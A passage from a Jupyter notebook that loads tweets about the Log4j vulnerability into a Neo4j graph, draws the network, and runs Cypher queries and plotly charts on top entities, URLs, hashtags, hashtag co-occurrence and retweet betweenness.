{\"id\": 201, \"label\": \"\", \"group\": \"username\", \"title\": \"Node('User', 'username', followers=28164, following=15378, id=262641807, joined='Tue Mar 08 13:13:33 +0000 2011', name='Ratan Jyoti', username='reach2ratan', verified=False)\"}, {\"id\": 3473, \"label\": \"\", \"group\": \"id\", \"title\": \"Node('Tweet', 'id', created_at='Tue Dec 21 04:30:33 +0000 2021', id=1473148864433557507, text='Using AWS security services to protect against, detect, and respond to the Log4j vulnerability\\u2026 https://t.co/gwvmmQyVos')\"}, {\"id\": 2404, \"label\": \"\", \"group\": \"id\", \"title\": \"Node('Tweet', 'id', created_at='Tue Dec 21 00:30:34 +0000 2021', id=1473088471073898497, text='After Log4j, December\\u2019s Patch Tuesday has snuck up on us https://t.co/dDNrgy7INP\\\\n\\\\n#CyberSecurity #digital #Hackers\\u2026 https://t.co/bHGWKYiEx6')\"}, {\"id\": 202, \"label\": \"\", \"group\": \"id\", \"title\": \"Node('Tweet', 'id', created_at='Mon Dec 20 22:30:34 +0000 2021', id=1473058269446885377, text='How to properly mitigate the Log4j vulnerabilities https://t.co/dBMTuEyC4d\\\\n\\\\n#CyberSecurity #digital #Hackers\\u2026 https://t.co/X0u2wvVEVv')\"}, {\"id\": 282, \"label\": \"\", \"group\": \"username\", \"title\": \"Node('User', 'username', username='WeldPond')\"}, {\"id\": 3512, \"label\": \"\", \"group\": \"Url\", \"title\": \"Node('Url', 'url', url='http://pbs.twimg.com/media/fhgtfduuuaai-ut.jpg')\"}, {\"id\": 4011, \"label\": \"\", \"group\": \"name\", \"title\": \"Node('Entity', 'name', label='NORP', name='Alibaba')\"}];\n",
       "    var edges = [{\"from\": 636, \"to\": 638, \"label\": \"CONTAINS\"}, {\"from\": 2684, \"to\": 2685, \"label\": \"CONTAINS\"}, {\"from\": 3157, \"to\": 296, \"label\": \"RETWEETS\"}, {\"from\": 3157, \"to\": 295, \"label\": \"MENTIONS\"}, {\"from\": 3157, \"to\": 294, \"label\": \"MENTIONS\"}, {\"from\": 3149, \"to\": 3152, \"label\": \"RETWEETS\"}, {\"from\": 3149, \"to\": 3151, \"label\": \"MENTIONS\"}, {\"from\": 2542, \"to\": 2500, \"label\": \"RETWEETS\"}, {\"from\": 2542, \"to\": 54, \"label\": \"MENTIONS\"}, {\"from\": 2542, \"to\": 2499, \"label\": \"CONTAINS\"}, {\"from\": 2219, \"to\": 2218, \"label\": \"POSTS\"}, {\"from\": 3460, \"to\": 3459, \"label\": \"POSTS\"}, {\"from\": 236, \"to\": 240, \"label\": \"RETWEETS\"}, {\"from\": 236, \"to\": 239, \"label\": \"MENTIONS\"}, {\"from\": 3541, \"to\": 233, \"label\": \"RETWEETS\"}, {\"from\": 3541, \"to\": 6, \"label\": \"MENTIONS\"}, {\"from\": 3838, \"to\": 3840, \"label\": \"CONTAINS\"}, {\"from\": 3985, \"to\": 3987, \"label\": \"CONTAINS\"}, {\"from\": 4518, \"to\": 4516, \"label\": \"TAGS\"}, {\"from\": 1110, \"to\": 1178, \"label\": \"POSTS\"}, {\"from\": 1110, \"to\": 1109, \"label\": \"POSTS\"}, {\"from\": 2813, \"to\": 2812, \"label\": \"POSTS\"}, {\"from\": 2626, \"to\": 2588, \"label\": \"REPLY_TO\"}, {\"from\": 2626, \"to\": 2630, \"label\": \"CONTAINS\"}, {\"from\": 1145, \"to\": 1149, \"label\": \"RETWEETS\"}, {\"from\": 1145, \"to\": 1148, \"label\": \"MENTIONS\"}, {\"from\": 1145, \"to\": 1147, \"label\": \"CONTAINS\"}, {\"from\": 743, \"to\": 742, \"label\": \"POSTS\"}, {\"from\": 602, \"to\": 567, \"label\": \"RETWEETS\"}, {\"from\": 602, \"to\": 566, \"label\": \"MENTIONS\"}, {\"from\": 602, \"to\": 565, \"label\": \"MENTIONS\"}, {\"from\": 602, \"to\": 564, \"label\": \"MENTIONS\"}, {\"from\": 148, \"to\": 147, \"label\": \"POSTS\"}, {\"from\": 2579, \"to\": 2500, \"label\": \"RETWEETS\"}, {\"from\": 2579, \"to\": 54, \"label\": \"MENTIONS\"}, {\"from\": 2579, \"to\": 2499, \"label\": \"CONTAINS\"}, {\"from\": 1066, \"to\": 1208, \"label\": \"TAGS\"}, {\"from\": 1066, \"to\": 1064, \"label\": \"TAGS\"}, {\"from\": 448, \"to\": 405, \"label\": \"RETWEETS\"}, {\"from\": 448, \"to\": 404, \"label\": \"MENTIONS\"}, {\"from\": 448, \"to\": 403, \"label\": \"MENTIONS\"}, {\"from\": 448, \"to\": 402, \"label\": \"MENTIONS\"}, {\"from\": 107, \"to\": 1665, \"label\": \"POSTS\"}, {\"from\": 107, \"to\": 106, \"label\": \"POSTS\"}, {\"from\": 3786, \"to\": 3788, \"label\": \"CONTAINS\"}, {\"from\": 371, \"to\": 370, \"label\": \"POSTS\"}, {\"from\": 2251, \"to\": 2250, \"label\": \"POSTS\"}, {\"from\": 1452, \"to\": 1451, \"label\": \"POSTS\"}, {\"from\": 1311, \"to\": 1313, \"label\": \"CONTAINS\"}, {\"from\": 470, \"to\": 4346, \"label\": \"TAGS\"}, {\"from\": 470, \"to\": 4323, \"label\": \"TAGS\"}, {\"from\": 470, \"to\": 3686, \"label\": \"TAGS\"}, {\"from\": 470, \"to\": 3682, \"label\": \"TAGS\"}, {\"from\": 470, \"to\": 3678, \"label\": \"TAGS\"}, {\"from\": 470, \"to\": 468, \"label\": \"TAGS\"}, {\"from\": 1881, \"to\": 1061, \"label\": \"RETWEETS\"}, {\"from\": 1881, \"to\": 1060, \"label\": \"MENTIONS\"}, {\"from\": 285, \"to\": 438, \"label\": \"POSTS\"}, {\"from\": 285, \"to\": 284, \"label\": \"POSTS\"}, {\"from\": 314, \"to\": 319, \"label\": \"RETWEETS\"}, {\"from\": 314, \"to\": 318, \"label\": \"MENTIONS\"}, {\"from\": 4103, \"to\": 4102, \"label\": \"REFERENCES\"}, {\"from\": 4103, \"to\": 4101, \"label\": \"REFERENCES\"}, {\"from\": 4103, \"to\": 4104, \"label\": \"CONTAINS\"}, {\"from\": 1173, \"to\": 1175, \"label\": \"CONTAINS\"}, {\"from\": 3208, \"to\": 3213, \"label\": \"REPLY_TO\"}, {\"from\": 3208, \"to\": 3212, \"label\": \"MENTIONS\"}, {\"from\": 3208, \"to\": 3211, \"label\": \"MENTIONS\"}, {\"from\": 3208, \"to\": 3210, \"label\": \"CONTAINS\"}, {\"from\": 56, \"to\": 59, \"label\": \"CONTAINS\"}, {\"from\": 56, \"to\": 58, \"label\": \"CONTAINS\"}, {\"from\": 805, \"to\": 136, \"label\": \"RETWEETS\"}, {\"from\": 805, \"to\": 135, \"label\": \"MENTIONS\"}, {\"from\": 805, \"to\": 134, \"label\": \"MENTIONS\"}, {\"from\": 805, \"to\": 133, \"label\": \"CONTAINS\"}, {\"from\": 109, \"to\": 112, \"label\": \"RETWEETS\"}, {\"from\": 109, \"to\": 111, \"label\": \"MENTIONS\"}, {\"from\": 3009, \"to\": 3008, \"label\": \"POSTS\"}, {\"from\": 3527, \"to\": 3528, \"label\": \"RETWEETS\"}, {\"from\": 3527, \"to\": 2382, \"label\": \"MENTIONS\"}, {\"from\": 1690, \"to\": 1692, \"label\": \"RETWEETS\"}, {\"from\": 1690, \"to\": 1691, \"label\": \"MENTIONS\"}, {\"from\": 3283, \"to\": 2395, \"label\": \"RETWEETS\"}, {\"from\": 3283, \"to\": 2396, \"label\": \"MENTIONS\"}, {\"from\": 3283, \"to\": 2399, \"label\": \"CONTAINS\"}, {\"from\": 3283, \"to\": 2398, \"label\": \"CONTAINS\"}, {\"from\": 4206, \"to\": 4208, \"label\": \"REFERENCES\"}, {\"from\": 4206, \"to\": 4204, \"label\": \"CONTAINS\"}, {\"from\": 4046, \"to\": 4045, \"label\": \"POSTS\"}, {\"from\": 771, \"to\": 770, \"label\": \"POSTS\"}, {\"from\": 3866, \"to\": 3868, \"label\": \"RETWEETS\"}, {\"from\": 3866, \"to\": 3845, \"label\": \"MENTIONS\"}, {\"from\": 621, \"to\": 623, \"label\": \"CONTAINS\"}, {\"from\": 2266, \"to\": 2268, \"label\": \"CONTAINS\"}, {\"from\": 2485, \"to\": 2488, \"label\": \"RETWEETS\"}, {\"from\": 2485, \"to\": 545, \"label\": \"MENTIONS\"}, {\"from\": 2485, \"to\": 2487, \"label\": \"MENTIONS\"}, {\"from\": 4427, \"to\": 4429, \"label\": \"CONTAINS\"}, {\"from\": 1010, \"to\": 1009, \"label\": \"POSTS\"}, {\"from\": 3877, \"to\": 3881, \"label\": \"REPLY_TO\"}, {\"from\": 3877, \"to\": 3880, \"label\": \"MENTIONS\"}, {\"from\": 3877, \"to\": 3879, \"label\": \"CONTAINS\"}, {\"from\": 1286, \"to\": 1289, \"label\": \"CONTAINS\"}, {\"from\": 1766, \"to\": 96, \"label\": \"RETWEETS\"}, {\"from\": 1766, \"to\": 95, \"label\": \"MENTIONS\"}, {\"from\": 2566, \"to\": 2500, \"label\": \"RETWEETS\"}, {\"from\": 2566, \"to\": 54, \"label\": \"MENTIONS\"}, {\"from\": 2566, \"to\": 2499, \"label\": \"CONTAINS\"}, {\"from\": 2368, \"to\": 2367, \"label\": \"POSTS\"}, {\"from\": 936, \"to\": 938, \"label\": \"CONTAINS\"}, {\"from\": 3802, \"to\": 3801, \"label\": \"POSTS\"}, {\"from\": 3981, \"to\": 3980, \"label\": \"POSTS\"}, {\"from\": 4138, \"to\": 4142, \"label\": \"REFERENCES\"}, {\"from\": 4138, \"to\": 4141, \"label\": \"REPLY_TO\"}, {\"from\": 4138, \"to\": 4140, \"label\": \"MENTIONS\"}, {\"from\": 2513, \"to\": 272, \"label\": \"RETWEETS\"}, {\"from\": 2513, \"to\": 271, \"label\": \"MENTIONS\"}, {\"from\": 2513, \"to\": 270, \"label\": \"CONTAINS\"}, {\"from\": 2194, \"to\": 2193, \"label\": \"TAGS\"}, {\"from\": 316, \"to\": 4420, \"label\": \"TAGS\"}, {\"from\": 316, \"to\": 4418, \"label\": \"TAGS\"}, {\"from\": 316, \"to\": 4413, \"label\": \"TAGS\"}, {\"from\": 316, \"to\": 4395, \"label\": \"TAGS\"}, {\"from\": 316, \"to\": 3865, \"label\": \"TAGS\"}, {\"from\": 316, \"to\": 461, \"label\": \"TAGS\"}, {\"from\": 316, \"to\": 319, \"label\": \"TAGS\"}, {\"from\": 316, \"to\": 322, \"label\": \"TAGS\"}, {\"from\": 316, \"to\": 320, \"label\": \"TAGS\"}, {\"from\": 316, \"to\": 314, \"label\": \"TAGS\"}, {\"from\": 201, \"to\": 3473, \"label\": \"POSTS\"}, {\"from\": 201, \"to\": 2404, \"label\": \"POSTS\"}, {\"from\": 201, \"to\": 202, \"label\": \"POSTS\"}];\n",
       "\n",
       "    var container = document.getElementById(\"104b6194-024e-431d-8fb0-8ff3864de7a0\");\n",
       "\n",
       "    var data = {\n",
       "        nodes: nodes,\n",
       "        edges: edges\n",
       "    };\n",
       "\n",
       "    var options = {\n",
       "    nodes: {\n",
       "        shape: 'dot',\n",
       "        size: 25,\n",
       "        font: {\n",
       "            size: 14\n",
       "        }\n",
       "    },\n",
       "    edges: {\n",
       "        font: {\n",
       "            size: 14,\n",
       "            align: 'middle'\n",
       "        },\n",
       "        color: 'gray',\n",
       "        arrows: {\n",
       "            to: {\n",
       "                enabled: true,\n",
       "                scaleFactor: 0.5\n",
       "            }\n",
       "        },\n",
       "        smooth: {\n",
       "            enabled: false\n",
       "        }\n",
       "    },\n",
       "    physics: {\n",
       "        enabled: true\n",
       "        }\n",
       "    };\n",
       "\n",
       "    var network = new vis.Network(container, data, options);\n",
       "\n",
       "</script>\n"
      ],
      "text/plain": [
       "<IPython.core.display.HTML object>"
      ]
     },
     "execution_count": 9,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "import neo4jupyter\n",
    "neo4jupyter.init_notebook_mode()\n",
    "\n",
    "\n",
    "\n",
    "options = {\"User\": \"username\", \"Hashtag\": \"name\"}\n",
    "\n",
    "neo4jupyter.draw(graph, options)"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "735a6fe6",
   "metadata": {},
   "source": [
    "<h2>Plotting</h2>"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 10,
   "id": "31a1956b",
   "metadata": {},
   "outputs": [],
   "source": [
    "import pandas as pd\n",
    "import chart_studio as cs\n",
    "cs.tools.set_credentials_file(username='rsickle1', api_key='')\n",
    "import chart_studio.plotly as py\n",
    "from plotly.graph_objs import *"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "638eb1bb",
   "metadata": {},
   "source": [
    "<h3>What are the top entities?</h3>"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 11,
   "id": "3c751c4c",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/html": [
       "<div>\n",
       "<style scoped>\n",
       "    .dataframe tbody tr th:only-of-type {\n",
       "        vertical-align: middle;\n",
       "    }\n",
       "\n",
       "    .dataframe tbody tr th {\n",
       "        vertical-align: top;\n",
       "    }\n",
       "\n",
       "    .dataframe thead th {\n",
       "        text-align: right;\n",
       "    }\n",
       "</style>\n",
       "<table border=\"1\" class=\"dataframe\">\n",
       "  <thead>\n",
       "    <tr style=\"text-align: right;\">\n",
       "      <th></th>\n",
       "      <th>entity</th>\n",
       "      <th>tweets</th>\n",
       "    </tr>\n",
       "  </thead>\n",
       "  <tbody>\n",
       "    <tr>\n",
       "      <th>0</th>\n",
       "      <td>Log4j</td>\n",
       "      <td>14</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>1</th>\n",
       "      <td>Apache</td>\n",
       "      <td>8</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>2</th>\n",
       "      <td>Chinese</td>\n",
       "      <td>7</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>3</th>\n",
       "      <td>Log4Shell</td>\n",
       "      <td>7</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>4</th>\n",
       "      <td>WAF</td>\n",
       "      <td>4</td>\n",
       "    </tr>\n",
       "  </tbody>\n",
       "</table>\n",
       "</div>"
      ],
      "text/plain": [
       "      entity  tweets\n",
       "0      Log4j      14\n",
       "1     Apache       8\n",
       "2    Chinese       7\n",
       "3  Log4Shell       7\n",
       "4        WAF       4"
      ]
     },
     "execution_count": 11,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "result = graph.run(\"MATCH (tweet:Tweet)-[:REFERENCES]->(entity:Entity) WHERE NOT entity.name =~ '.*#'  \\\n",
    "                 RETURN entity.name AS entity, count(tweet) AS tweets  \\\n",
    "                 ORDER BY tweets DESC LIMIT 5\").data()\n",
    "        \n",
    "df = pd.DataFrame(result)\n",
    "df.head()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 12,
   "id": "390b661c",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "image/png": "[encoded data removed]",
      "text/plain": [
       "<IPython.core.display.Image object>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    }
   ],
   "source": [
    "data = [Bar(x=df[\"entity\"], y=df[\"tweets\"])]\n",
    "\n",
    "py.image.ishow({'data': data})"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "422c0e6e",
   "metadata": {},
   "source": [
    "<h3>What are the top urls?</h3>"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 13,
   "id": "4594ed78",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/html": [
       "<div>\n",
       "<style scoped>\n",
       "    .dataframe tbody tr th:only-of-type {\n",
       "        vertical-align: middle;\n",
       "    }\n",
       "\n",
       "    .dataframe tbody tr th {\n",
       "        vertical-align: top;\n",
       "    }\n",
       "\n",
       "    .dataframe thead th {\n",
       "        text-align: right;\n",
       "    }\n",
       "</style>\n",
       "<table border=\"1\" class=\"dataframe\">\n",
       "  <thead>\n",
       "    <tr style=\"text-align: right;\">\n",
       "      <th></th>\n",
       "      <th>url</th>\n",
       "      <th>tweets</th>\n",
       "    </tr>\n",
       "  </thead>\n",
       "  <tbody>\n",
       "    <tr>\n",
       "      <th>0</th>\n",
       "      <td>http://pbs.twimg.com/media/fheb81owyacza0x.jpg</td>\n",
       "      <td>39</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>1</th>\n",
       "      <td>http://pbs.twimg.com/media/fhf3t9dviaatxsv.jpg</td>\n",
       "      <td>32</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>2</th>\n",
       "      <td>http://pbs.twimg.com/tweet_video_thumb/fheoa8k...</td>\n",
       "      <td>20</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>3</th>\n",
       "      <td>https://t.co/p34gtrvjix</td>\n",
       "      <td>13</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>4</th>\n",
       "      <td>https://t.co/zltwpoxdcl</td>\n",
       "      <td>12</td>\n",
       "    </tr>\n",
       "  </tbody>\n",
       "</table>\n",
       "</div>"
      ],
      "text/plain": [
       "                                                 url  tweets\n",
       "0     http://pbs.twimg.com/media/fheb81owyacza0x.jpg      39\n",
       "1     http://pbs.twimg.com/media/fhf3t9dviaatxsv.jpg      32\n",
       "2  http://pbs.twimg.com/tweet_video_thumb/fheoa8k...      20\n",
       "3                            https://t.co/p34gtrvjix      13\n",
       "4                            https://t.co/zltwpoxdcl      12"
      ]
     },
     "execution_count": 13,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "result = graph.run(\"MATCH (tweet:Tweet)-[:CONTAINS]->(url:Url)         \\\n",
    "                 RETURN url.url AS url, count(tweet) AS tweets \\\n",
    "                 ORDER BY tweets DESC LIMIT 5\").data()\n",
    "        \n",
    "df = pd.DataFrame(result)\n",
    "df.head()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 14,
   "id": "e48fe843",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "image/png": "[encoded data removed]",
      "text/plain": [
       "<IPython.core.display.Image object>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    }
   ],
   "source": [
    "data = [Bar(x=df[\"url\"], y=df[\"tweets\"])]\n",
    "\n",
    "py.image.ishow({'data': data})"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "d45b3bcd",
   "metadata": {},
   "source": [
    "<h3>What are the top hashtags?</h3>"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 15,
   "id": "bf2a97cf",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/html": [
       "<div>\n",
       "<style scoped>\n",
       "    .dataframe tbody tr th:only-of-type {\n",
       "        vertical-align: middle;\n",
       "    }\n",
       "\n",
       "    .dataframe tbody tr th {\n",
       "        vertical-align: top;\n",
       "    }\n",
       "\n",
       "    .dataframe thead th {\n",
       "        text-align: right;\n",
       "    }\n",
       "</style>\n",
       "<table border=\"1\" class=\"dataframe\">\n",
       "  <thead>\n",
       "    <tr style=\"text-align: right;\">\n",
       "      <th></th>\n",
       "      <th>hashtag</th>\n",
       "      <th>tweets</th>\n",
       "    </tr>\n",
       "  </thead>\n",
       "  <tbody>\n",
       "    <tr>\n",
       "      <th>0</th>\n",
       "      <td>log4j</td>\n",
       "      <td>393</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>1</th>\n",
       "      <td>cybersecurity</td>\n",
       "      <td>159</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>2</th>\n",
       "      <td>infosec</td>\n",
       "      <td>87</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>3</th>\n",
       "      <td>log4shell</td>\n",
       "      <td>68</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>4</th>\n",
       "      <td>hacking</td>\n",
       "      <td>46</td>\n",
       "    </tr>\n",
       "  </tbody>\n",
       "</table>\n",
       "</div>"
      ],
      "text/plain": [
       "         hashtag  tweets\n",
       "0          log4j     393\n",
       "1  cybersecurity     159\n",
       "2        infosec      87\n",
       "3      log4shell      68\n",
       "4        hacking      46"
      ]
     },
     "execution_count": 15,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "result = graph.run(\"MATCH (hashtag:Hashtag)-[:TAGS]->(tweet:Tweet)         \\\n",
    "                 WHERE hashtag.name <> 'rstats'                         \\\n",
    "                 RETURN hashtag.name AS hashtag, count(tweet) AS tweets \\\n",
    "                 ORDER BY tweets DESC LIMIT 5\").data()\n",
    "        \n",
    "df = pd.DataFrame(result)\n",
    "df.head()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 16,
   "id": "d9f21070",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "image/png": "[encoded data removed]",
      "text/plain": [
       "<IPython.core.display.Image object>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    }
   ],
   "source": [
    "data = [Bar(x=df[\"hashtag\"], y=df[\"tweets\"])]\n",
    "\n",
    "py.image.ishow({'data': data})"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "63b0e69a",
   "metadata": {},
   "source": [
    "<h2>What's the hashtag and mention count distribution?</h2>"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 19,
   "id": "d7cde946",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/html": [
       "<div>\n",
       "<style scoped>\n",
       "    .dataframe tbody tr th:only-of-type {\n",
       "        vertical-align: middle;\n",
       "    }\n",
       "\n",
       "    .dataframe tbody tr th {\n",
       "        vertical-align: top;\n",
       "    }\n",
       "\n",
       "    .dataframe thead th {\n",
       "        text-align: right;\n",
       "    }\n",
       "</style>\n",
       "<table border=\"1\" class=\"dataframe\">\n",
       "  <thead>\n",
       "    <tr style=\"text-align: right;\">\n",
       "      <th></th>\n",
       "      <th>hashtags</th>\n",
       "      <th>mentions</th>\n",
       "    </tr>\n",
       "  </thead>\n",
       "  <tbody>\n",
       "    <tr>\n",
       "      <th>0</th>\n",
       "      <td>2</td>\n",
       "      <td>2</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>1</th>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>2</th>\n",
       "      <td>2</td>\n",
       "      <td>1</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>3</th>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>4</th>\n",
       "      <td>0</td>\n",
       "      <td>1</td>\n",
       "    </tr>\n",
       "  </tbody>\n",
       "</table>\n",
       "</div>"
      ],
      "text/plain": [
       "   hashtags  mentions\n",
       "0         2         2\n",
       "1         0         0\n",
       "2         2         1\n",
       "3         0         0\n",
       "4         0         1"
      ]
     },
     "execution_count": 19,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "result = graph.run(\"MATCH (tweet:Tweet)                                   \\\n",
    "                 RETURN tweet.id,                                      \\\n",
    "                        size((:Hashtag)-[:TAGS]->(tweet)) AS hashtags, \\\n",
    "                        size((tweet)-[:MENTIONS]->(:User)) AS mentions\").data()\n",
    "            \n",
    "df = pd.DataFrame(result)\n",
    "del df[\"tweet.id\"]\n",
    "df.head()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 20,
   "id": "26bc778e",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "image/png": "[encoded data removed]",
      "text/plain": [
       "<IPython.core.display.Image object>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    }
   ],
   "source": [
    "hashtags = Histogram(x=df[\"hashtags\"], opacity=0.75, name=\"Hashtags\")\n",
    "mentions = Histogram(x=df[\"mentions\"], opacity=0.75, name=\"Mentions\")\n",
    "data = [hashtags, mentions]\n",
    "layout = Layout(barmode=\"overlay\",paper_bgcolor='rgba(0,0,0,0)',plot_bgcolor='rgba(0,0,0,0)')\n",
    "fig = Figure(data=data, layout=layout)\n",
    "\n",
    "py.image.ishow(fig)"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "707fc9ce",
   "metadata": {},
   "source": [
    "<h2>Heatmap of hashtag co-occurrence</h2>"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 21,
   "id": "8f78449d",
   "metadata": {
    "scrolled": true
   },
   "outputs": [
    {
     "data": {
      "text/html": [
       "<div>\n",
       "<style scoped>\n",
       "    .dataframe tbody tr th:only-of-type {\n",
       "        vertical-align: middle;\n",
       "    }\n",
       "\n",
       "    .dataframe tbody tr th {\n",
       "        vertical-align: top;\n",
       "    }\n",
       "\n",
       "    .dataframe thead th {\n",
       "        text-align: right;\n",
       "    }\n",
       "</style>\n",
       "<table border=\"1\" class=\"dataframe\">\n",
       "  <thead>\n",
       "    <tr style=\"text-align: right;\">\n",
       "      <th></th>\n",
       "      <th>h1.name</th>\n",
       "      <th>h2.name</th>\n",
       "      <th>weight</th>\n",
       "    </tr>\n",
       "  </thead>\n",
       "  <tbody>\n",
       "    <tr>\n",
       "      <th>0</th>\n",
       "      <td>log4j</td>\n",
       "      <td>log4shell</td>\n",
       "      <td>56</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>1</th>\n",
       "      <td>log4j</td>\n",
       "      <td>security</td>\n",
       "      <td>6</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>2</th>\n",
       "      <td>log4j</td>\n",
       "      <td>threatintel</td>\n",
       "      <td>9</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>3</th>\n",
       "      <td>log4j</td>\n",
       "      <td>technology</td>\n",
       "      <td>1</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>4</th>\n",
       "      <td>cybersecurity</td>\n",
       "      <td>log4j</td>\n",
       "      <td>42</td>\n",
       "    </tr>\n",
       "  </tbody>\n",
       "</table>\n",
       "</div>"
      ],
      "text/plain": [
       "         h1.name      h2.name  weight\n",
       "0          log4j    log4shell      56\n",
       "1          log4j     security       6\n",
       "2          log4j  threatintel       9\n",
       "3          log4j   technology       1\n",
       "4  cybersecurity        log4j      42"
      ]
     },
     "execution_count": 21,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "result = graph.run(\"MATCH (h:Hashtag)                           \\\n",
    "                 WHERE h.name <> 'rstats'                    \\\n",
    "                 WITH h, size((h)-[:TAGS]->(:Tweet)) AS tags \\\n",
    "                 ORDER BY tags DESC                          \\\n",
    "                 LIMIT 15                                    \\\n",
    "                                                             \\\n",
    "                 WITH collect(h) AS top_hash                 \\\n",
    "                 UNWIND top_hash AS h1                       \\\n",
    "                 UNWIND top_hash AS h2                       \\\n",
    "                                                             \\\n",
    "                 MATCH (h1)-[:TAGS]->(:Tweet)<-[:TAGS]-(h2)  \\\n",
    "                 WHERE h1.name < h2.name                     \\\n",
    "                 RETURN h1.name, h2.name, count(*) AS weight\").data()\n",
    "            \n",
    "df = pd.DataFrame(result)\n",
    "df.head()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 22,
   "id": "32e3f7ef",
   "metadata": {},
   "outputs": [],
   "source": [
    "names = list(set(list(df[\"h1.name\"]) + list(df[\"h2.name\"])))\n",
    "heat = [[0 for i in range(len(names))] for j in range(len(names))] \n",
    "\n",
    "for idx, row in df.iterrows():\n",
    "    i = names.index(row[\"h1.name\"])\n",
    "    j = names.index(row[\"h2.name\"])\n",
    "    heat[i][j] = row[\"weight\"]"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 23,
   "id": "ad800614",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "image/png": "[encoded data removed]",
      "text/plain": [
       "<IPython.core.display.Image object>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    }
   ],
   "source": [
    "import plotly.graph_objs as go\n",
    "\n",
    "data = [go.Heatmap(z = heat, x = names, y = names)]\n",
    "py.image.ishow({'data': data})"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "b01b72b6",
   "metadata": {},
   "source": [
    "<h2>Graph Algorithms</h2>"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "d2b66ac4",
   "metadata": {},
   "source": [
    "The typical workflow consists of retrieving a subgraph from Neo4j via Cypher and analyzing this graph in igraph."
   ]
  },
  {
   "cell_type": "markdown",
   "id": "26985ed7",
   "metadata": {},
   "source": [
    "<h3>A subgraph of users retweeting other users</h3>"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 24,
   "id": "1d4e06ec",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "<igraph.Graph at 0x1ab18966d60>"
      ]
     },
     "execution_count": 24,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "from igraph import Graph as IGraph\n",
    "\n",
    "query = \"\"\"\n",
    "MATCH (user1:User)-[:POSTS]->(retweet:Tweet)-[:RETWEETS]->(tweet:Tweet),\n",
    "      (user2:User)-[:POSTS]->(tweet)\n",
    "RETURN user1.username, user2.username, count(*) AS weight\n",
    "\"\"\"\n",
    "\n",
    "data = graph.run(query)\n",
    "\n",
    "ig = IGraph.TupleList(data, weights=True)\n",
    "ig"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "048976f2",
   "metadata": {},
   "source": [
    "<h3>Which users have the highest betweenness?</h3>"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "8f699aac",
   "metadata": {},
   "source": [
    "$betweenness(v) = \\\\sum_{s, t \\\\in V} \\\\frac{\\\\sigma_{st}(v)}{\\\\sigma_{st}}$"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "a588dea4",
   "metadata": {},
   "source": [
    "The betweenness centrality of a node $v$ is the number of shortest paths that pass through $v$, $\\\\sigma_{st}(v)$,  divided by the total number of shortest paths, $\\\\sigma_{st}$"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 25,
   "id": "f7818b59",
   "metadata": {},
   "outputs": [
    {
     "data": {
